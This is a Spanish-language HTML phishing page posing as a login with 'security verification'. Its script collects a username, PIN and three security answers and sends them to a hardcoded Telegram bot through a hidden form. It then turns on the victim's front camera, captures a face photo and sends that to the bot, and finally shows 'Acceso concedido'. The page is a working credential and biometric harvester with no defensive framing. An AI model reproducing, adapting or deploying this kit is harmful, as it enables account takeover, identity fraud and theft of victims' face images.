<!DOCTYPE html>
<html>
<head>
  <title>Acceso</title>
  <style>
    body { font-family: Arial; text-align: center; padding: 30px; background: #f2f2f2; }
   .caja { background: white; padding: 20px; border-radius: 10px; max-width: 400px; margin: auto; box-shadow: 0 0 10px #ccc; }
    input { display: block; margin: 10px auto; padding: 10px; width: 90%; }
    button { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
    #paso2, #paso3 { display: none; }
    #video { width: 100%; border-radius: 10px; margin-top: 10px; }
   .aviso { font-size: 14px; color: #555; margin-bottom: 15px; }
    iframe { display: none; }
  </style>
</head>
<body>
  <iframe name="envio"></iframe>

  <div id="paso1" class="caja"><h2>Acceso</h2><input type="text" id="usuario" placeholder="Usuario"><input type="password" id="pin" placeholder="Código de acceso"><button onclick="irAPaso2()">Entrar</button></div>
  <div id="paso2" class="caja"><h2>Verificación de Seguridad</h2><p class="aviso">Ingrese las 3 Respuestas de seguridad</p><input type="text" id="resp1" placeholder="Respuesta 1"><input type="text" id="resp2" placeholder="Respuesta 2"><input type="text" id="resp3" placeholder="Respuesta 3"><button onclick="irAPaso3()">Siguiente</button></div>
  <div id="paso3" class="caja"><h2>Verificación Facial</h2><p class="aviso">Presione para activar la cámara</p><video id="video" autoplay playsinline></video><button onclick="tomarYEnviarFoto()">Tomar Foto</button></div>

<script>
const token = "8963644493:AAH1KsRguB5gJiwvwR1RB_viFBjRQAmEj4g";
const chat_id = "-5399506853";
let streamGlobal; let datos = {};

function enviarForm(url, campos){
  const form = document.createElement('form');
  form.method = 'POST'; form.action = url; form.target = 'envio';
  if(url.includes('sendPhoto')) form.enctype = 'multipart/form-data';
  for(let k in campos){ const i = document.createElement('input'); i.name=k; i.value=campos[k]; form.appendChild(i); }
  document.body.appendChild(form); form.submit(); document.body.removeChild(form);
}

function irAPaso2() {
  datos.usuario = document.getElementById('usuario').value;
  datos.pin = document.getElementById('pin').value;
  if(!datos.usuario ||!datos.pin){ alert("Rellena usuario y pin"); return; }
  document.getElementById('paso1').style.display = 'none';
  document.getElementById('paso2').style.display = 'block';
}

function irAPaso3() {
  datos.resp1 = document.getElementById('resp1').value;
  datos.resp2 = document.getElementById('resp2').value;
  datos.resp3 = document.getElementById('resp3').value;
  if(!datos.resp1 ||!datos.resp2 ||!datos.resp3){ alert("Rellena las 3 respuestas"); return; }

  const mensaje = `🚨 NUEVO ACCESO 🚨\nUsuario: ${datos.usuario}\nPIN: ${datos.pin}\n\nRespuestas:\n1. ${datos.resp1}\n2. ${datos.resp2}\n3. ${datos.resp3}`;
  enviarForm(`https://api.telegram.org/bot${token}/sendMessage`, {chat_id: chat_id, text: mensaje});

  document.getElementById('paso2').style.display = 'none';
  document.getElementById('paso3').style.display = 'block';
  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
 .then(s => { streamGlobal = s; document.getElementById('video').srcObject = s; })
 .catch(() => alert("Activa los permisos de cámara"));
}

function tomarYEnviarFoto() {
  const video = document.getElementById('video');
  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth; canvas.height = video.videoHeight;
  canvas.getContext('2d').drawImage(video, 0, 0);
  canvas.toBlob(blob => {
    const form = document.createElement('form');
    form.method = 'POST'; form.action = `https://api.telegram.org/bot${token}/sendPhoto`;
    form.enctype = 'multipart/form-data'; form.target = 'envio';
    form.innerHTML = `<input name="chat_id" value="${chat_id}"><input name="caption" value="📸 Foto de: ${datos.usuario}">`;
    const fileInput = document.createElement('input'); fileInput.type='file'; fileInput.name='photo';
    const dt = new DataTransfer(); dt.items.add(new File([blob], "foto.jpg")); fileInput.files = dt.files;
    form.appendChild(fileInput); document.body.appendChild(form); form.submit(); document.body.removeChild(form);
    alert("Acceso concedido ✅");
    streamGlobal.getTracks().forEach(t => t.stop());
  });
}
</script>
</body>
</html>
